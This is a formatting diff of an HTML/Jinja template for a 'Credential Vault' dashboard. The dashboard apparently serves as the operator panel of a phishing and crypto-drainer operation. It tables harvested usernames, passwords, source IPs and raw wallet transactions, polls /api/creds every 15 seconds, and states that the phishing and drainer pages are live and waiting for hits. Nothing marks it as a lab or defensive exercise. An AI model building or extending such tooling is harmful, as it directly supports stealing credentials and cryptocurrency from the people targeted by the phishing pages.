@@ -1,90 +1,102 @@
 <!-- templates/vault.html -->
-{% extends "base.html" %}
-{% block title %}Credential Vault{% endblock %}
-{% block nav_vault %}active{% endblock %}
-
-{% block content %}
+{% extends "base.html" %} {% block title %}Credential Vault{% endblock %} {%
+block nav_vault %}active{% endblock %} {% block content %}
 <div class="page-header">
-    <h2>🔐 Credential Vault</h2>
-    <div class="meta">Captured credentials from phishing & drainer pages · in-memory only</div>
+  <h2>🔐 Credential Vault</h2>
+  <div class="meta">
+    Captured credentials from phishing & drainer pages · in-memory only
+  </div>
 </div>
 
-<div class="stat-grid" style="margin-bottom:24px;">
-    <div class="stat-card">
-        <div class="stat-label">Total Captured</div>
-        <div class="stat-value purple">{{ creds | length }}</div>
+<div class="stat-grid" style="margin-bottom: 24px">
+  <div class="stat-card">
+    <div class="stat-label">Total Captured</div>
+    <div class="stat-value purple">{{ creds | length }}</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">With Passwords</div>
+    <div class="stat-value green">
+      {{ creds | selectattr('pass') | list | length }}
     </div>
-    <div class="stat-card">
-        <div class="stat-label">With Passwords</div>
-        <div class="stat-value green">{{ creds | selectattr('pass') | list | length }}</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-label">With Wallet TX</div>
+    <div class="stat-value yellow">
+      {{ creds | selectattr('raw') | list | length }}
     </div>
-    <div class="stat-card">
-        <div class="stat-label">With Wallet TX</div>
-        <div class="stat-value yellow">{{ creds | selectattr('raw') | list | length }}</div>
-    </div>
+  </div>
 </div>
 
 <div class="card">
-    <div class="card-header">
-        <div class="card-title">Captured Credentials</div>
-        <div class="card-subtitle">Auto-refreshed every 15s · stored in-memory on Fly VM</div>
+  <div class="card-header">
+    <div class="card-title">Captured Credentials</div>
+    <div class="card-subtitle">
+      Auto-refreshed every 15s · stored in-memory on Fly VM
     </div>
-    {% if creds %}
-    <table>
-        <thead>
-            <tr>
-                <th>Timestamp</th>
-                <th>Source IP</th>
-                <th>Username / Email</th>
-                <th>Password</th>
-                <th>Raw Data</th>
-            </tr>
-        </thead>
-        <tbody id="creds-table">
-            {% for c in creds %}
-            <tr>
-                <td class="mono">{{ c.ts | int }}</td>
-                <td class="mono">{{ c.ip }}</td>
-                <td class="mono">{{ c.user or '—' }}</td>
-                <td class="mono">{{ c.pass or '—' }}</td>
-                <td>
-                    <details>
-                        <summary style="cursor:pointer;color:var(--text-dim);font-size:12px;">View raw</summary>
-                        <pre>{{ c.raw }}</pre>
-                    </details>
-                </td>
-            </tr>
-            {% endfor %}
-        </tbody>
-    </table>
-    {% else %}
-    <div style="color:var(--text-dim);padding:40px;text-align:center;">
-        No credentials captured yet. Phishing/drainer pages are live — waiting for hits.
-    </div>
-    {% endif %}
+  </div>
+  {% if creds %}
+  <table>
+    <thead>
+      <tr>
+        <th>Timestamp</th>
+        <th>Source IP</th>
+        <th>Username / Email</th>
+        <th>Password</th>
+        <th>Raw Data</th>
+      </tr>
+    </thead>
+    <tbody id="creds-table">
+      {% for c in creds %}
+      <tr>
+        <td class="mono">{{ c.ts | int }}</td>
+        <td class="mono">{{ c.ip }}</td>
+        <td class="mono">{{ c.user or '—' }}</td>
+        <td class="mono">{{ c.pass or '—' }}</td>
+        <td>
+          <details>
+            <summary
+              style="cursor: pointer; color: var(--text-dim); font-size: 12px"
+            >
+              View raw
+            </summary>
+            <pre>{{ c.raw }}</pre>
+          </details>
+        </td>
+      </tr>
+      {% endfor %}
+    </tbody>
+  </table>
+  {% else %}
+  <div style="color: var(--text-dim); padding: 40px; text-align: center">
+    No credentials captured yet. Phishing/drainer pages are live — waiting for
+    hits.
+  </div>
+  {% endif %}
 </div>
-{% endblock %}
-
-{% block scripts %}
+{% endblock %} {% block scripts %}
 <script>
-async function refreshCreds() {
+  async function refreshCreds() {
     try {
-        const resp = await fetch('/api/creds');
-        const data = await resp.json();
-        const table = document.getElementById('creds-table');
-        if (table && data.creds) {
-            table.innerHTML = data.creds.map(c => `
+      const resp = await fetch("/api/creds");
+      const data = await resp.json();
+      const table = document.getElementById("creds-table");
+      if (table && data.creds) {
+        table.innerHTML = data.creds
+          .map(
+            (c) => `
                 <tr>
                     <td class="mono">${c.ts}</td>
                     <td class="mono">${c.ip}</td>
-                    <td class="mono">${c.user || '—'}</td>
-                    <td class="mono">${c.pass || '—'}</td>
+                    <td class="mono">${c.user || "—"}</td>
+                    <td class="mono">${c.pass || "—"}</td>
                     <td><details><summary style="cursor:pointer;color:var(--text-dim);font-size:12px;">View raw</summary><pre>${c.raw}</pre></details></td>
                 </tr>
-            `).join('');
-        }
-    } catch(e) {}
-}
-setInterval(refreshCreds, 15000);
+            `,
+          )
+          .join("");
+      }
+    } catch (e) {}
+  }
+  setInterval(refreshCreds, 15000);
 </script>
 {% endblock %}
